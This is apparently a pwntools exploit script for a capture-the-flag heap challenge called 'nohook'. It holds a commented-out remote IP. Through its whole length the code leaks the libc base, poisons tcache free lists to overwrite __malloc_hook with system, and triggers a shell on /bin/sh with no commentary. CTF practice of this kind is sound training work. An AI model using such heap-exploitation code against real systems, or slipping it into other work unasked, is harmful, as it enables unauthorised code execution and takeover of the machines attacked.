#utf-8
from pwn import *
context.log_level='debug'

sh = process('./nohook')
#sh = remote('47.104.143.202',25997)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size):
	sh.recvuntil('exit')
	sh.sendline('1')
	sh.recvuntil('size:')
	sh.sendline(str(size))
def dele(idx):
	sh.recvuntil('exit')	
	sh.sendline('3')
	sh.recvuntil('id:')
	sh.sendline(str(idx))
def edit(idx,content):
	sh.recvuntil('exit')	
	sh.sendline('4')
	sh.recvuntil('id:')
	sh.sendline(str(idx))
	sh.send(content)
def show(idx):
	sh.recvuntil('exit')	
	sh.sendline('2')
	sh.recvuntil('id:')
	sh.sendline(str(idx))

add(0x420)#0
add(0x10)#1
edit(1,'/bin/sh\x00')
dele(0)
show(0)
sh.recvuntil('\x7f\x00\x00')
libcbase = u64(sh.recv(6).ljust(8,b'\x00')) + 0x7f2be7c93000 - 0x7f2be7e7ebe0
binsh = libcbase + 0x7f7c9aa4c5aa - 0x7f7c9a895000

add(0x30)#2
add(0x30)#3
dele(3)
dele(2)
edit(2,p64(libcbase+libc.sym['__malloc_hook']-0x10))
add(0x30)#4 -2 
add(0x30)#5
edit(5,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))

add(0x10)#6
add(0x10)#7
dele(7)
dele(6)
edit(6,p64(libcbase+libc.sym['__malloc_hook']))
add(0x10)#8-6
add(0x10)#9 f




######### not used
add(0x10)#10
add(0x10)#11
dele(11)
dele(10)
edit(10,p64(libcbase+libc.sym['__memalign_hook']))
add(0x10)#12
add(0x10)#13
one=[0xe6c7e,0xe6c81,0xe6c84]
edit(13,p64(libcbase+one[0])+p64(0x21))
########### not used




add(0x10)#14
add(0x10)#15
dele(15)
dele(14)
edit(14,p64(libcbase+libc.sym['system']))
add(0x10)
#gdb.attach(sh)
dele(9)
#gdb.attach(sh)
add(str(binsh-1))
log.success(hex(libcbase))
sh.interactive()
